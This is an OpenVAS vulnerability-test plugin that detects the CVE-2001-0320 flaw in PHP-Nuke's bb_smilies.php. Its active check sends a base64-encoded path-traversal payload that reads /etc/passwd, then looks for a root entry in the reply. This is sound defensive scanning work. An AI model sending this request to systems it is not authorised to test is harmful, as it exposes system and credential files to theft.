# OpenVAS Vulnerability Test
# $Id: php_nuke_bb_smilies_passwd.nasl 17 2013-10-27 14:01:43Z jan $
# Description: PHP-Nuke security vulnerability (bb_smilies.php)
#
# Authors:
# SecuriTeam
# Updated: 2009/04/23
# Chandan S <schandan@secpod.com>
#
# Copyright:
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host seems to be vulnerable to a security problem in PHP-Nuke (bb_smilies.php).
  The vulnerability is caused by inadequate processing of queries by PHP-Nuke's bb_smilies.php
  which results in returning the content of any file we desire (the file needs to be world-readable).
  A similar vulnerability in the same PHP program allows execution of arbitrary code by changing
  the password of the administrator of bb_smilies.";

tag_solution = "upgrade to the latest version (Version 4.4.1 and above).

  Additional information:
  http://www.securiteam.com/securitynews/Serious_security_hole_in_PHP-Nuke__bb_smilies_.html";

tag_impact = "Every file that the webserver has access to can be read by anyone. It is
  also possible to change bb_smilies' administrator password and even execute
  arbitrary commands.";

if (description)
{
  script_id(10630);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-0320");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("PHP-Nuke security vulnerability (bb_smilies.php)");
  desc = "
  Summary:
  " + tag_summary + "
  Impact:
  " + tag_impact + "

  Solution:
  " + tag_solution;

  script_description(desc);
  script_summary("Determine if a remote host is vulnerable to the bb_smilies.php vulnerability");
  script_category(ACT_GATHER_INFO);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2001 SecuriTeam");
  script_dependencies("secpod_php_nuke_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port)){
  exit(0);
}


phpVer =get_kb_item("www/" + port + "/php-nuke");
phpVer = eregmatch(pattern:"(.*) under (.*)", string:phpVer);

if(phpVer[1] == NULL && phpVer[2] == NULL){
   exit(0);
}

version=phpVer[1];
dir = phpVer[2];

if(!safe_checks())
{
  data = http_get(item:string(dir, "/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK"), port:port);
  resultrecv = http_keepalive_send_recv(port:port, data:data);
  if(resultrecv == NULL){
    exit(0);
  }
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:resultrecv))
  {
   security_warning(port);
   exit(0);
  }
}

if(version_is_less_equal(version:version,test_version:"4.4.1")){
      security_warning(port);
      exit(0);
 }
